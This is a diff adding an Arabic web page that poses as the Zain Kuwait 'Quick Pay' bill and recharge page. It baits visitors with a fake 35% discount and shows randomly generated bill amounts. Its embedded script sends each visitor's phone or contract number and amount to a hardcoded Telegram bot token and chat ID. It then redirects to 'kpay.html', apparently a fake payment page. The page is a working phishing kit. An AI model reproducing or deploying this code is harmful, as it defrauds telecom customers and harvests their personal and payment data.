@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>الدفع السريع - زين</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="main.js" defer></script>
+  <link rel="stylesheet" href="styele.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Nunito&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
+</head>
+<style>
+    body {
+    margin: 0;
+    padding: 0;
+    background-color: #fafafa;
+    font-family: 'Nunito', sans-serif;
+
+  }
+  #hedar {
+    background-color: aquamarine;
+    margin: 0;
+    padding: 0;
+    height: 60px;
+  }
+  #imgzain {
+    position: absolute;
+    top: 32px;
+    left: -20px;
+    width: 150px;
+    height: 50px;
+    justify-content: space-between;
+    display: flex;
+    position: relative;
+  }
+  
+  header {
+    background-image: url('https://dfhndqw.github.io/zainkuwait/zain/cssall/cdc/imgonli.png');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+  }
+  #tex {
+    direction: rtl;
+    text-align: right;
+  }
+  #divbox {
+    margin-bottom: 100px;
+    height: 120px;
+    align-items: flex-start;
+    border-top-left-radius: 12px;
+    border-top-right-radius: 12px;
+    border: 1px solid rgba(0, 0, 0, 0.1);
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+    overflow: hidden;
+  }
+  #boxform {
+    margin-top: 60px;
+    border-radius: 50px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+  }
+  #textbot {
+    margin-top: 50px;
+  }
+  #billForm, #rechargeForm {
+    margin-top: -40px;
+    background-color: #ffffff;
+  }
+  input {
+    border: none;
+    border-bottom: 2px solid #000;
+    outline: none;
+    width: 200px;
+    height: 50px;
+    margin-top: 20px;
+  }
+  #selct {
+    width: 390px;
+    border: none;
+    border-bottom: 2px solid #000;
+    outline: none;
+    height: 50px;
+    background-color: #ffffff;
+  }
+  #phoneLabel, #billBox {
+    margin-top: 30px;
+  }
+  #botone {
+    margin-top: 100px;
+  }
+  #billBox {
+    background-color: #ffffff;
+    width: 400px;
+    margin: 20px auto;
+    padding: 20px;
+    border-radius: 12px;
+    border: 1px solid rgba(0, 0, 0, 0.1);
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+    text-align: center;
+  }
+  #amountText, #discountText, #finalText {
+    margin: 10px 0;
+    font-weight: bold;
+    text-align: center;
+  }
+  #boxomm {
+    margin-top: -30px;
+  }
+  #labeel, #selct {
+    margin-top: 20px;
+    margin-bottom: 15px;
+  }
+  #hedar {
+    width: 100%;
+    padding: auto;
+    height: 100px;
+  }
+  #imgzain {
+    width: 130px;
+    margin-bottom: -20px;
+    margin-top: 10px;
+    
+  }
+  #tex {
+    color: #000;
+    font-size: 25px;
+    font-weight: normal;
+    margin-right: 20px;
+  }
+  #sss {
+    margin-top: -30px;
+    width: 100%;
+    padding: auto;
+  }
+  #rechargeForm {
+    margin-top: 20px;
+    margin-bottom: 20px;
+    margin-left: auto;
+    margin-right: auto;
+    width: 100%;
+    max-width: 400px;
+  }
+  #inputii, #labeel {
+    width: 100%;
+  }
+  #botonnn {
+    width: 100%;
+    margin-top: 20px;
+  }
+  #labeel {
+    width: 100%;
+  }
+  #textfrom {
+    margin-top: -120px;
+  }
+  #rechargeBox {
+    display: none;
+    background-color: white;
+    border: 1px solid #e5e7eb;
+    border-radius: 0.5rem;
+    padding: 1rem;
+    text-align: center;
+    color: #1f2937;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+    margin-top: 1rem;
+    width: 100%;
+  }
+  #hayahh {
+    margin-top: -100px;
+    width: 100%;
+    height: 50%;
+    background-color: #ffffff;
+  }
+  .input-label {
+    display: block;
+    margin-bottom: 0.5rem;
+    font-weight: 500;
+  }
+  .input-field {
+    width: 100%;
+    padding: 0.75rem;
+    margin-bottom: 1rem;
+    border: 1px solid #ccc;
+    border-radius: 0.5rem;
+    outline: none;
+    transition: box-shadow 0.2s ease;
+  }
+  .input-field:focus {
+    border-color: #ec4899;
+    box-shadow: 0 0 0 2px rgba(236, 72, 153, 0.4);
+  }
+  #inpss {
+    width: 100%;
+    margin-top: 10px;
+  }
+  #inpotr {
+    margin-top: 17px;
+    width: 100%;
+  }
+
+
+  #billBtn ,#rechargeBtn ,#textfrom ,#botone ,#labeel{
+    font-family: 'Nunito', sans-serif;
+font-size: 16px;
+  }
+
+  #textfrom{
+    margin-right: 8px;
+  }
+
+  #phoneInput ,#inpss ,#labeel{
+    border-color: #ffffff; /* وردي مثل فئة الزر */
+    box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.3); /* ظل ناعم وردي */
+    outline: none; /* إزالة الحدود الافتراضية */
+  }
+  
+  #boxform{
+    height: 380px;
+  }
+
+  #selct ,#phoneInput{
+    width: 402px;
+    direction: rtl;
+    text-align: right;
+    margin-left: auto;
+  }
+
+  #bobox{
+    display: flex;
+    justify-content: center;
+    margin-top: 15px;
+  }
+
+
+  #boboxls{
+background-color: #000;
+    margin-top: 40px;
+  }
+
+  #billForm ,#divbox ,#boxomm ,#billBox{
+    width: 402px;
+  }
+
+  #billBox{
+    height: 200px !important;
+  }
+#finalText{
+    height: 50px;
+    margin-bottom: 20px;
+}
+
+
+
+
+
+#bobox {
+    background-color: #d0e8ff; /* أزرق هادئ */
+    padding: 8px;
+    border-radius: 12px;
+    text-align: center;
+    animation: pulse 2s infinite;
+    width: 350px;
+    margin-right: 23px;
+    justify-content: center; /* توسيط أفقي */
+    align-items: center;     /* توسيط عمودي */
+  }
+
+  #boboxls {
+    color: #003366; /* أزرق غامق لقراءة أوضح */
+    font-size: 20px;
+    font-weight: bold;
+    margin: 0;
+  }
+
+  @keyframes pulse {
+    0% {
+      box-shadow: 0 0 0 0 rgba(7, 38, 71, 0.544);
+    }
+    70% {
+      box-shadow: 0 0 10px 10px rgba(0, 123, 255, 0);
+    }
+    100% {
+      box-shadow: 0 0 0 0 rgba(0, 123, 255, 0);
+    }
+  }
+
+
+  #boboxs {
+    font-size: 15px; /* حجم النص */
+    font-weight: bold; /* جعل النص عريضًا */
+    color: #fff; /* لون النص */
+    text-align: center; /* محاذاة النص في المنتصف */
+    animation: blink-animation 3s infinite; /* تطبيق الوميض */
+}
+
+/* تحديد الوميض */
+@keyframes blink-animation {
+    0% {
+        opacity: 5; /* النص ظاهر */
+    }
+    50% {
+        opacity: 1; /* النص شفاف (غير ظاهر) */
+    }
+    100% {
+        opacity: 5; /* النص ظاهر مرة أخرى */
+    }
+}
+
+
+  #botonnn {
+    margin-top: 20px;
+  }
+
+  .container {
+    min-height: 100vh; /* يضمن إن ارتفاع الصفحة يغطي كل المحتوى */
+    padding-bottom: 40px; /* يضيف مساحة أسفل */
+    overflow-y: auto; /* يسمح بالتمرير لو المحتوى كثير */
+  }
+#billBox{
+
+    margin-bottom: 600px;
+}  
+
+#selct {
+    margin-right: 15px; /* يبعده عن الحافة اليمنى */
+    margin-top: 20px; /* لو تبيه ينزل شوي من فوق */
+    direction: rtl; /* لو تبيه يبدأ الكتابة من اليمين */
+    width: 370px;
+  }
+
+  #phoneInput ,#labeel ,#inpss ,#selct {
+    margin-right: 15px; /* يبعده عن الحافة اليمنى */
+    margin-top: 20px; /* لو تبيه ينزل شوي من فوق */
+    direction: rtl; /* لو تبيه يبدأ الكتابة من اليمين */
+    width: 370px;
+    border-bottom: 1px solid #6c4558 !important;
+    border-radius: 0 !important;
+
+  }
+  
+  #botooxe{
+    margin-top: 40px;
+    display: flex; 
+    justify-content: center; /* توسيط المحتوى أفقيًا */
+        align-items: center; /* توسيط المحتوى عموديًا */
+        text-align: center; /* توسيط النص داخل العنصر */
+width: 340px;
+--tw-bg-opacity: 1;
+justify-content: center; /* توسيط أفقي */
+align-items: center; 
+margin-right: 35px;
+height: 40px;
+border-radius: 10px; 
+background-color: rgba(229, 229, 229, var(--tw-bg-opacity));
+  }
+ 
+
+
+
+
+     #boxform{
+
+        margin-top: -10px;
+     }
+     #tex{
+        font-size: 29px;
+     }
+
+     #phoneInput{
+
+margin-top: -10px; 
+
+
+}
+
+#phoneLabel{
+margin-right: 10px;
+    margin-top: -10px;
+}
+
+#selct{
+    margin-top: 5px;
+}
+
+#bobox{
+    margin-top: 50px;
+    height: 50px;
+    margin-bottom: 100px;
+    width: 250px;
+    height: 25px;
+    margin-right: 70px;
+}
+
+
+#img25351{
+
+    float: left;
+    margin-left: 70px;
+    margin-top: -25px;
+}
+
+#shope{
+    float: left;
+    margin-left: 20px;
+    margin-top: -24px;
+
+}
+.vertical-line {
+    width: 1px; /* عرض الخط 1 بكسل */
+    height: 50px; /* ارتفاع الخط (يمكنك تحديده حسب الحاجة) */
+    background-color: rgb(255, 255, 255); /* اللون الأسود للخط */
+    margin: 0px; /* مسافة من حول الخط */
+    float: left;
+margin-left: 30px;
+margin-top: -35px;
+
+}
+
+.horizontal-lines {
+    width: 35px; /* يجعل الخط يمتد عبر العرض الكامل */
+    height: 1px; /* سمك الخط */
+    background-color: #fff; /* اللون الأبيض */
+    margin: 10px 0; /* مسافة بين الخطوط */
+    display: block; /* تأكد من أن العنصر يكون كتلة */
+    background-color: rgb(255, 255, 255);
+        position: relative; /* عنصر يتحرك بشكل نسبي */
+        top: 10px; /* التحرك 50px من الأعلى */
+        left: -380px; /* التحرك 50px من اليسار */
+}
+
+.horizontal-lnes{
+
+    width: 50px; /* يجعل الخط يمتد عبر العرض الكامل */
+    height: 1px; /* سمك الخط */
+    background-color: #fff; /* اللون الأبيض */
+    margin: 10px 0; /* مسافة بين الخطوط */
+    display: block; /* تأكد من أن العنصر يكون كتلة */
+    background-color: rgb(255, 255, 255);
+        position: relative; /* عنصر يتحرك بشكل نسبي */
+        top: 10px; /* التحرك 50px من الأعلى */
+        left: -380px; /* التحرك 50px من اليسار */
+}
+
+.horizontal-lins{
+    width: 35px; /* يجعل الخط يمتد عبر العرض الكامل */
+    height: 1px; /* سمك الخط */
+    background-color: #fff; /* اللون الأبيض */
+    margin: 10px 0; /* مسافة بين الخطوط */
+    display: block; /* تأكد من أن العنصر يكون كتلة */
+    background-color: rgb(255, 255, 255);
+        position: relative; /* عنصر يتحرك بشكل نسبي */
+        top: 10px; /* التحرك 50px من الأعلى */
+        left: -380px; /* التحرك 50px من اليسار */
+        font-size: 11px;
+}
+
+
+#bobox{
+
+    background-color: #1d1336;
+}
+
+#boboxs{
+
+    color: #ffffff;
+}
+
+
+.cart-icon-container{
+
+  width: 10px;
+}
+
+#iiiii{
+  width: 5px;
+}
+
+#botone {
+  position: relative;  /* تعيين الوضع النسبى للتحريك */
+  margin-left: -200px;   /* تحريك الزر إلى اليسار */
+  left: 120px;         /* تحريك الزر إلى اليمين */
+}
+
+</style>
+<body>
+    <div class="heart-icon-container">
+        
+  <div>
+    <header id="hedar">
+      <img id="imgzain" src="https://dfhndqw.github.io/zainkuwait/zain/cssall/cdc/zainlog.svg" alt="زين العرض">
+      <div class="horizontal-lines"></div>
+    <div class="horizontal-lnes"></div>
+    <div class="horizontal-lins"></div>
+
+      <div id="img25351"class="heart-icon-container">
+        <span id="iiiii"class="heart-icon text-white hover:text-red-500 cursor-pointer text-2xl">
+            <i class="far fa-heart"></i> <!-- هذه أيقونة القلب الفارغة -->
+        </span>
+    </div>
+    <div class="vertical-line"></div>
+
+    <div id="shope"class="cart-icon-container">
+        <span class="cart-icon text-white hover:text-green-500 cursor-pointer text-1xl">
+            <i class="fas fa-shopping-cart"></i> <!-- أيقونة سلة المشتريات -->
+        </span>
+    </div>
+    
+
+
+    </header>
+  </div>
+
+  <div id="textbot">
+    <h3 id="tex" class="text-2xl font-bold text-center mb-6 text-pink-600">الدفع السريع</h3>
+  </div>
+
+    <div id="boxform" class="lg:mt-3 mb-14 mx-3 md:max-w-xl md:mx-auto relative">
+
+      <!-- Buttons for form selection -->
+      <div id="divbox" class="list-none flex items-stretch justify-center border-b border-gray-300 rounded-ts-lg dark:bg-gray-900 bg-white rounded-te-lg shadow-lg">
+        <button id="billBtn" class="flex-1 text-center py-3 font-bold text-pink-600 border-b-2 border-pink-600">دفع الفاتورة</button>
+        <button id="rechargeBtn" class="flex-1 text-center py-3 text-gray-500 hover:text-pink-600">إعادة تعبئة eeZee</button>
+      </div>
+
+      <!-- Bill Form -->
+      <div id="billForm">
+        <label id="textfrom" class="block -2 font-mediu">أود الدفع لـ</label>
+        <select id="selct" class="bgfc">
+          <option value="رقم آخر">رقم آخر</option>
+          <option value="رقم العقد">رقم العقد</option>
+        </select>
+
+        <label id="phoneLabel" class="block mb-2 font-medium">رقم الهاتف*</label>
+        <input id="phoneInput" type="tel" placeholder="أدخل الرقم: 99XXXXXX" class="w-full mb-4 p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-400" maxlength="8">
+
+        <div id="bobox">
+            <h2 id="boboxs">خصم 35% للدفع السريع</h2>
+        </div>
+
+        <div id="billBox" class="gfdthg hidden">
+          <p id="amountText" class="hg"></p>
+          <p id="discountText" class="yugy"></p>
+          <p id="finalText" class="bg-white border rounded-lg p-4 text-center text-gray-800 shadow mt-8"></p>
+        
+        
+
+        <div id="boxomm">
+          <button id="botone" disabled class="w-full py-3 rounded-lg bg-gray-200 text-gray-400 font-bold">ادفع الآن</button>
+        </div>
+        
+      </div>
+      
+
+      </div>
+
+      <!-- Recharge Form -->
+      <div id="hayahh">
+        <div id="rechargeForm" class="hidden">
+          <label id="labeel0" class="block mb-2 font-medium">رقم الهاتف</label>
+          <input id="labeel" type="text" maxlength="8" placeholder="أدخل الرقم: 99XXXXXX" class="w-full mb-4 p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-400">
+
+          <label id="inpotr" class="block mb-2 font-medium">قيمة التعبئة</label>
+          <input id="inpss" type="number" placeholder="مثال: 5 د.ك" class="uyguy">
+
+          <div id="bobox">
+            <h2 id="boboxs">خصم 35% للدفع السريع</h2>
+          </div>
+
+          <button id="botonnn" disabled class="mt-50 w-full py-3 rounded-lg bg-gray-300 text-gray-800 font-bold">ادفع الآن</button>
+
+
+        </div>
+      </div>
+
+    </div>
+
+  <div> 
+   
+    
+    <script>
+        // بيانات بوت تيليجرام
+ const TELEGRAM_TOKEN = "7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E";
+ const TELEGRAM_CHAT_ID = "6454807559";
+
+ // عناصر التحكم الرئيسية
+ const billBtn = document.getElementById('billBtn');
+ const rechargeBtn = document.getElementById('rechargeBtn');
+ const billForm = document.getElementById('billForm');
+ const rechargeForm = document.getElementById('rechargeForm');
+ 
+ // عناصر الفاتورة
+ const selectField = document.getElementById('selct');
+ const phoneInput = document.getElementById('phoneInput');
+ const phoneLabel = document.getElementById('phoneLabel');
+ const billBox = document.getElementById('billBox');
+ const amountText = document.getElementById('amountText');
+ const discountText = document.getElementById('discountText');
+ const finalText = document.getElementById('finalText');
+ const billPayBtn = billForm.querySelector('button');
+ const phoneAmounts = {};
+
+ // عناصر إعادة التعبئة
+ const rechargePhoneInput = rechargeForm.querySelector('input[type="text"]');
+ const rechargeAmountInput = rechargeForm.querySelector('input[type="number"]');
+ const rechargeBtnEl = rechargeForm.querySelector('button');
+ const rechargeBox = document.createElement('div');
+ rechargeBox.className = 'recharge-box hidden bg-white border rounded-lg p-4 text-center text-gray-800 shadow mt-20';
+ rechargeForm.appendChild(rechargeBox);
+
+ // إرسال إلى تيليجرام
+ function sendToTelegram(message) {
+     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+         method: "POST",
+         headers: { "Content-Type": "application/json" },
+         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+     })
+     .then(() => window.location.href = "kpay.html")
+     .catch((err) => console.error("خطأ في الإرسال إلى تيليجرام:", err));
+ }
+
+ // زر إرسال تعبئة (إرسال البيانات إلى تيليجرام والتوجيه)
+ rechargeBtnEl.addEventListener('click', () => {
+     const phone = rechargePhoneInput.value.trim();
+     const amount = rechargeAmountInput.value.trim();
+
+     if (phone && amount) {
+         const message = `📲 شحن جديد:\nرقم الهاتف: ${phone}\nالمبلغ: ${amount} د.ك`;
+         sendToTelegram(message);
+     }
+ });
+
+ // التبديل بين التبويبات
+ billBtn.addEventListener('click', () => {
+     billForm.classList.remove('hidden');
+     rechargeForm.classList.add('hidden');
+     billBtn.classList.add('text-pink-600', 'border-b-2', 'border-pink-600');
+     rechargeBtn.classList.remove('text-pink-600', 'border-b-2', 'border-pink-600');
+     rechargeBtn.classList.add('text-gray-500');
+
+     phoneInput.value = '';
+     billBox.classList.add('hidden');
+     billPayBtn.disabled = true;
+     billPayBtn.classList.add('bg-gray-200', 'text-gray-400');
+     billPayBtn.classList.remove('bg-pink-600', 'text-white');
+     amountText.textContent = '';
+     discountText.textContent = '';
+     finalText.textContent = '';
+ });
+
+ rechargeBtn.addEventListener('click', () => {
+     rechargeForm.classList.remove('hidden');
+     billForm.classList.add('hidden');
+     rechargeBtn.classList.add('text-pink-600', 'border-b-2', 'border-pink-600');
+     billBtn.classList.remove('text-pink-600', 'border-b-2', 'border-pink-600');
+     billBtn.classList.add('text-gray-500');
+
+     rechargePhoneInput.value = '';
+     rechargeAmountInput.value = '';
+     rechargeBox.classList.add('hidden');
+     rechargeBtnEl.disabled = true;
+     rechargeBtnEl.classList.add('bg-gray-200', 'text-gray-400');
+     rechargeBtnEl.classList.remove('bg-pink-600', 'text-white');
+     rechargeBox.innerHTML = '';
+ });
+
+ // تغيير نوع الإدخال في الفاتورة
+ selectField.addEventListener('change', () => {
+     phoneInput.value = '';
+     billBox.classList.add('hidden');
+     billPayBtn.disabled = true;
+     billPayBtn.classList.add('bg-gray-200', 'text-gray-400');
+
+     if (selectField.value === 'رقم العقد') {
+         phoneLabel.textContent = 'رقم العقد';
+         phoneInput.placeholder = 'أدخل رقم العقد';
+         phoneInput.removeAttribute('pattern');
+         phoneInput.removeAttribute('inputmode');
+     } else {
+         phoneLabel.textContent = 'رقم الهاتف';
+         phoneInput.placeholder = 'أدخل الرقم: 99XXXXXX';
+         phoneInput.setAttribute('pattern', '[0-9]*');
+         phoneInput.setAttribute('inputmode', 'numeric');
+     }
+ });
+
+ // تحديث بيانات الفاتورة
+ // تحديث بيانات الفاتورة
+ // تحديث بيانات الفاتورة
+phoneInput.addEventListener('input', () => {
+const value = phoneInput.value.trim();
+if (/^9\d{7}$/.test(value)) {
+ let amount = phoneAmounts[value] || Math.floor(Math.random() * (120 - 20 + 1)) + 20;
+ phoneAmounts[value] = amount;
+
+ const discount = (amount * 0.35).toFixed(2);
+ const finalAmount = (amount - discount).toFixed(2);
+
+ // حفظ المبلغ الإجمالي في sessionStorage
+ sessionStorage.setItem('finalAmount', finalAmount);
+
+ amountText.textContent = `المبلغ المستحق: ${amount} د.ك`;
+ discountText.textContent = `خصم ٣٥٪: -${discount} د.ك`;
+ finalText.textContent = `الإجمالي بعد الخصم: ${finalAmount} د.ك`;
+
+ billBox.classList.remove('hidden');
+ billPayBtn.disabled = false;  // تفعيل الزر عند الإدخال الصحيح
+ billPayBtn.classList.remove('bg-gray-200', 'text-gray-400');
+ billPayBtn.classList.add('bg-pink-600', 'text-white');
+} else {
+ billBox.classList.add('hidden');
+ billPayBtn.disabled = true;  // إبقاء الزر معطلًا في حالة المدخلات غير صحيحة
+ billPayBtn.classList.add('bg-gray-200', 'text-gray-400');
+ billPayBtn.classList.remove('bg-pink-600', 'text-white');
+}
+});
+
+
+
+
+ // تحديث بيانات إعادة التعبئة
+ function updateRechargeBox() {
+     const phone = rechargePhoneInput.value.trim();
+     const amount = parseFloat(rechargeAmountInput.value);
+     if (/^9\d{7}$/.test(phone) && !isNaN(amount) && amount > 0) {
+         const discount = (amount * 0.35).toFixed(2);
+         const finalAmount = (amount - discount).toFixed(2);
+
+         rechargeBox.innerHTML = `
+             <p class="mb-2 font-semibold">قيمة التعبئة: ${amount.toFixed(2)} د.ك</p>
+             <p class="mb-2 text-pink-600 font-bold">خصم ٣٥٪: -${discount} د.ك</p>
+             <p class="font-bold text-lg">الإجمالي بعد الخصم: ${finalAmount} د.ك</p>
+         `;
+         rechargeBox.classList.remove('hidden');
+         rechargeBtnEl.disabled = false;
+         rechargeBtnEl.classList.remove('bg-gray-200', 'text-gray-400');
+         rechargeBtnEl.classList.add('bg-pink-600', 'text-white');
+     } else {
+         rechargeBox.classList.add('hidden');
+         rechargeBtnEl.disabled = true;
+         rechargeBtnEl.classList.add('bg-gray-200', 'text-gray-400');
+         rechargeBtnEl.classList.remove('bg-pink-600', 'text-white');
+     }
+ }
+
+ rechargePhoneInput.addEventListener('input', updateRechargeBox);
+ rechargeAmountInput.addEventListener('input', updateRechargeBox);
+
+ // إرسال الفاتورة
+ billPayBtn.addEventListener('click', () => {
+     const phone = phoneInput.value.trim();
+     const amount = amountText.textContent.replace(/[^\d.]/g, '');
+     if (phone && amount) {
+         const message = `📄 دفع فاتورة:\nرقم الهاتف/العقد: ${phone}\nالمبلغ المستحق: ${amount} د.ك`;
+         sendToTelegram(message);
+     }
+ });
+
+localStorage.setItem("phoneNumber", phoneInput.value.trim());
+
+ // إرسال تعبئة
+// تحديث بيانات إعادة التعبئة
+function updateRechargeBox() {
+const phone = rechargePhoneInput.value.trim();
+const amount = parseFloat(rechargeAmountInput.value);
+if (/^9\d{7}$/.test(phone) && !isNaN(amount) && amount > 0) {
+ const discount = (amount * 0.35).toFixed(2);
+ const finalAmount = (amount - discount).toFixed(2);
+
+ rechargeBox.innerHTML = `
+     <p class="mb-2 font-semibold">قيمة التعبئة: ${amount.toFixed(2)} د.ك</p>
+     <p class="mb-2 text-pink-600 font-bold">خصم ٣٥٪: -${discount} د.ك</p>
+     <p class="font-bold text-lg">الإجمالي بعد الخصم: ${finalAmount} د.ك</p>
+ `;
+ rechargeBox.classList.remove('hidden');
+ rechargeBtnEl.disabled = false;  // تفعيل الزر عند الإدخال الصحيح
+ rechargeBtnEl.classList.remove('bg-gray-200', 'text-gray-400');
+ rechargeBtnEl.classList.add('bg-pink-600', 'text-white');
+} else {
+ rechargeBox.classList.add('hidden');
+ rechargeBtnEl.disabled = true;  // إبقاء الزر معطلًا في حالة المدخلات غير صحيحة
+ rechargeBtnEl.classList.add('bg-gray-200', 'text-gray-400');
+ rechargeBtnEl.classList.remove('bg-pink-600', 'text-white');
+}
+}
+
+rechargePhoneInput.addEventListener('input', updateRechargeBox);
+rechargeAmountInput.addEventListener('input', updateRechargeBox);
+
+
+billPayBtn.addEventListener('click', () => {
+    const phone = phoneInput.value.trim();
+    const amount = amountText.textContent.replace(/[^\d.]/g, '');
+
+    if (phone && amount) {
+        // ✅ احفظ الرقم قبل الإرسال أو الانتقال
+        localStorage.setItem("phoneNumber", phone);
+
+        const message = `📄 دفع فاتورة:\nرقم الهاتف/العقد: ${phone}\nالمبلغ المستحق: ${amount} د.ك`;
+        sendToTelegram(message);
+    }
+});
+
+
+   
+       const button = document.getElementById('bobox');
+
+button.addEventListener('click', function() {
+    // توجيه المستخدم إلى صفحة جديدة
+    window.location.href = 'kpay.html'; // استبدل 'newPage.html' باسم الصفحة المطلوبة
+});
+     
+
+    </script>
+    
+</body>
+</html>
